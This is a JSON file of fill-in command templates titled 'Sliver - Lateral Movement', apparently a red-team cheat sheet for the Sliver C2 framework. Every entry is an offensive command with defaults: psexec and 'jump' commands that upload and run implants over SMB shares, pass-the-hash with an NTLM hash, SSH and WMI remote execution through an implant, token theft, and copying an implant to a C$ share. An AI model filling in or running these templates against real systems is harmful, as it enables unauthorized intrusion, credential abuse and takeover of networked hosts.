{
  "title": "Sliver - Lateral Movement",
  "commands": [
    {
      "args": [
        {
          "name": "target_ip",
          "description": "Target hostname or IP",
          "default": "192.168.1.100"
        },
        {
          "name": "implant_path",
          "description": "Local path to the implant binary to upload and execute",
          "default": "/tmp/implant.exe"
        },
        {
          "name": "domain",
          "description": "Domain for authentication",
          "default": "WORKGROUP"
        },
        {
          "name": "username",
          "description": "Username for authentication",
          "default": "Administrator"
        },
        {
          "name": "password",
          "description": "Password for authentication",
          "default": "P@ssw0rd"
        }
      ],
      "title": "PSExec lateral movement (SMB service creation)",
      "description": "Copies an implant to the target via ADMIN$ share and executes it as a service. Supports -h/--hash for pass-the-hash.",
      "template": "psexec -d {domain} -u {username} -p {password} {target_ip} {implant_path}"
    },
    {
      "args": [
        {
          "name": "target_ip",
          "description": "Target hostname or IP",
          "default": "192.168.1.100"
        },
        {
          "name": "target_binpath",
          "description": "Existing binary path on the target",
          "default": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "title": "PSExec with existing binary path (no upload)",
      "template": "psexec {target_ip} --binpath {target_binpath}"
    },
    {
      "args": [
        {
          "name": "target_ip",
          "description": "Target hostname or IP",
          "default": "192.168.1.100"
        },
        {
          "name": "implant_name",
          "description": "Name of the implant profile to use",
          "default": "my-implant"
        },
        {
          "name": "username",
          "description": "Username for authentication",
          "default": "Administrator"
        },
        {
          "name": "password",
          "description": "Password for authentication",
          "default": "P@ssw0rd"
        }
      ],
      "title": "Jump command — generate, upload, and execute implant on target",
      "template": "jump -u {username} -p {password} {target_ip} {implant_name}"
    },
    {
      "args": [
        {
          "name": "target_ip",
          "description": "Target hostname or IP",
          "default": "192.168.1.100"
        },
        {
          "name": "implant_name",
          "description": "Implant profile to use",
          "default": "my-implant"
        },
        {
          "name": "ntlm_hash",
          "description": "NTLM hash for pass-the-hash",
          "default": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
        }
      ],
      "title": "Jump with pass-the-hash (NTLM)",
      "description": "Uses NTLM hash for authentication (no password needed).",
      "template": "jump -H {ntlm_hash} {target_ip} {implant_name}"
    },
    {
      "args": [
        {
          "name": "target_host",
          "description": "Target hostname or IP",
          "default": "10.10.10.20"
        },
        {
          "name": "command",
          "description": "Command to execute on target",
          "default": "whoami"
        },
        {
          "name": "username",
          "description": "SSH username",
          "default": "root"
        },
        {
          "name": "password",
          "description": "SSH password or key path",
          "default": "password123"
        },
        {
          "name": "port",
          "description": "SSH port",
          "default": "22"
        }
      ],
      "title": "SSH command execution via implant (lateral pivot)",
      "description": "Uses the implant's SSH client to execute commands on remote hosts.",
      "template": "ssh {target_host} {command} -u {username} -p {password} --port {port}"
    },
    {
      "args": [
        {
          "name": "pid",
          "description": "PID of the process whose token to steal",
          "default": "1234"
        }
      ],
      "title": "Steal a Windows token from a process (Windows only)",
      "template": "steal-token {pid}"
    },
    {
      "args": [
        {
          "name": "target_host",
          "description": "Target hostname or IP",
          "default": "10.10.10.20"
        },
        {
          "name": "command",
          "description": "Command execution via WMI",
          "default": "powershell -enc <base64>"
        },
        {
          "name": "username",
          "description": "WMI username",
          "default": "Administrator"
        },
        {
          "name": "password",
          "description": "WMI password",
          "default": "P@ssw0rd"
        }
      ],
      "title": "WMI command execution via execute-assembly with SharpWMI",
      "description": "Requires SharpWMI extension installed from armory.",
      "template": "execute-assembly SharpWMI.exe action=exec computername={target_host} command=\"{command}\""
    },
    {
      "args": [
        {
          "name": "target_host",
          "description": "Target hostname or IP",
          "default": "10.10.10.20"
        },
        {
          "name": "local_path",
          "description": "Local file to upload via SMB",
          "default": "/tmp/implant.exe"
        },
        {
          "name": "remote_share",
          "description": "Remote SMB share path",
          "default": "C$"
        },
        {
          "name": "remote_path",
          "description": "Remote destination path",
          "default": "\\Users\\Public\\implant.exe"
        }
      ],
      "title": "Upload file to ADMIN$/C$ share via SMB",
      "description": "Uploads a file to a Windows SMB share. Requires valid credentials on the target.",
      "template": "upload {local_path} \\\\{target_host}\\{remote_share}{remote_path}"
    }
  ]
}